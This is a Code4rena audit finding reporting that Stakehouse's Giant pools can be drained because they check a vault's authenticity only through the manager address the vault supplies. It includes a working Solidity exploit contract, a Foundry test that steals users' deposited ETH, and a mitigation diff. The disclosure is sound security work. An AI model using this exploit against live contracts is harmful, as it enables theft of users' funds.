## Tags

- bug
- 3 (High Risk)
- primary issue
- satisfactory
- selected for report
- sponsor confirmed
- H-17

# [Giant pools can be drained due to weak vault authenticity check](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/251) 

# Lines of code

https://github.com/code-423n4/2022-11-stakehouse/blob/5f853d055d7aa1bebe9e24fd0e863ef58c004339/contracts/liquid-staking/GiantSavETHVaultPool.sol#L50
https://github.com/code-423n4/2022-11-stakehouse/blob/5f853d055d7aa1bebe9e24fd0e863ef58c004339/contracts/liquid-staking/GiantMevAndFeesPool.sol#L44


# Vulnerability details

## Impact
An attacker can withdraw all ETH staked by users in a Giant pool. Both `GiantSavETHVaultPool` and `GiantMevAndFeesPool` are affected.
## Proof of Concept
The `batchDepositETHForStaking` function in the Giant pools check whether a provided vault is authentic by validating its liquid staking manager contract and sends funds to the vault when the check passes ([GiantSavETHVaultPool.sol#L48-L58](https://github.com/code-423n4/2022-11-stakehouse/blob/5f853d055d7aa1bebe9e24fd0e863ef58c004339/contracts/liquid-staking/GiantSavETHVaultPool.sol#L48-L58)):
```solidity
SavETHVault savETHPool = SavETHVault(_savETHVaults[i]);
require(
    liquidStakingDerivativeFactory.isLiquidStakingManager(address(savETHPool.liquidStakingManager())),
    "Invalid liquid staking manager"
);

// Deposit ETH for staking of BLS key
savETHPool.batchDepositETHForStaking{ value: transactionAmount }(
    _blsPublicKeys[i],
    _stakeAmounts[i]
);
```

An attacker can pass an exploit contract as a vault. The exploit contract will implement `liquidStakingManager` that will return a valid staking manager contract address to trick a Giant pool into sending ETH to the exploit contract:
```solidity
// test/foundry/GiantPools.t.sol
contract GiantPoolExploit {
    address immutable owner = msg.sender;
    address validStakingManager;

    constructor(address validStakingManager_) {
        validStakingManager = validStakingManager_;
    }

    function liquidStakingManager() public view returns (address) {
        return validStakingManager;
    }

    function batchDepositETHForStaking(bytes[] calldata /*_blsPublicKeyOfKnots*/, uint256[] calldata /*_amounts*/) external payable {
        payable(owner).transfer(address(this).balance);
    }
}

function testPoolDraining_AUDIT() public {
    // Register BLS key
    address nodeRunner = accountOne; vm.deal(nodeRunner, 12 ether);
    registerSingleBLSPubKey(nodeRunner, blsPubKeyOne, accountFour);

    // Set up users and ETH
    address savETHUser = accountThree; vm.deal(savETHUser, 24 ether);

    address attacker = address(0x1337);
    vm.label(attacker, "attacker");
    vm.deal(attacker, 1 ether);

    // User deposits ETH into Giant savETH
    vm.prank(savETHUser);
    giantSavETHPool.depositETH{value: 24 ether}(24 ether);
    assertEq(giantSavETHPool.lpTokenETH().balanceOf(savETHUser), 24 ether);
    assertEq(address(giantSavETHPool).balance, 24 ether);

    // Attacker deploys an exploit.
    vm.startPrank(attacker);
    GiantPoolExploit exploit = new GiantPoolExploit(address(manager));
    vm.stopPrank();

    // Attacker calls `batchDepositETHForStaking` to deposit ETH to their exploit contract.
    bytes[][] memory blsKeysForVaults = new bytes[][](1);
    blsKeysForVaults[0] = getBytesArrayFromBytes(blsPubKeyOne);

    uint256[][] memory stakeAmountsForVaults = new uint256[][](1);
    stakeAmountsForVaults[0] = getUint256ArrayFromValues(24 ether);

    giantSavETHPool.batchDepositETHForStaking(
        getAddressArrayFromValues(address(exploit)),
        getUint256ArrayFromValues(24 ether),
        blsKeysForVaults,
        stakeAmountsForVaults
    );

    // Vault got nothing.
    assertEq(address(manager.savETHVault()).balance, 0 ether);
    // Attacker has stolen user's deposit.
    assertEq(attacker.balance, 25 ether);
}
```
## Tools Used
Manual review
## Recommended Mitigation Steps
Consider taking a list of `LiquidStakingManager` addresses instead of vault addresses:
```diff
--- a/contracts/liquid-staking/GiantSavETHVaultPool.sol
+++ b/contracts/liquid-staking/GiantSavETHVaultPool.sol
@@ -27,12 +28,12 @@ contract GiantSavETHVaultPool is StakehouseAPI, GiantPoolBase {
     /// @param _blsPublicKeys For every savETH vault, the list of BLS keys of LSDN validators receiving funding
     /// @param _stakeAmounts For every savETH vault, the amount of ETH each BLS key will receive in funding
     function batchDepositETHForStaking(
-        address[] calldata _savETHVaults,
+        address[] calldata _liquidStakingManagers,
         uint256[] calldata _ETHTransactionAmounts,
         bytes[][] calldata _blsPublicKeys,
         uint256[][] calldata _stakeAmounts
     ) public {
-        uint256 numOfSavETHVaults = _savETHVaults.length;
+        uint256 numOfSavETHVaults = _liquidStakingManagers.length;
         require(numOfSavETHVaults > 0, "Empty arrays");
         require(numOfSavETHVaults == _ETHTransactionAmounts.length, "Inconsistent array lengths");
         require(numOfSavETHVaults == _blsPublicKeys.length, "Inconsistent array lengths");
@@ -40,16 +41,18 @@ contract GiantSavETHVaultPool is StakehouseAPI, GiantPoolBase {

         // For every vault specified, supply ETH for at least 1 BLS public key of a LSDN validator
         for (uint256 i; i < numOfSavETHVaults; ++i) {
+            require(
+                liquidStakingDerivativeFactory.isLiquidStakingManager(_liquidStakingManagers[i]),
+                "Invalid liquid staking manager"
+            );
+
             uint256 transactionAmount = _ETHTransactionAmounts[i];

             // As ETH is being deployed to a savETH pool vault, it is no longer idle
             idleETH -= transactionAmount;

-            SavETHVault savETHPool = SavETHVault(_savETHVaults[i]);
-            require(
-                liquidStakingDerivativeFactory.isLiquidStakingManager(address(savETHPool.liquidStakingManager())),
-                "Invalid liquid staking manager"
-            );
+            LiquidStakingManager liquidStakingManager = LiquidStakingManager(payable(_liquidStakingManagers[i]));
+            SavETHVault savETHPool = liquidStakingManager.savETHVault();

             // Deposit ETH for staking of BLS key
             savETHPool.batchDepositETHForStaking{ value: transactionAmount }(
```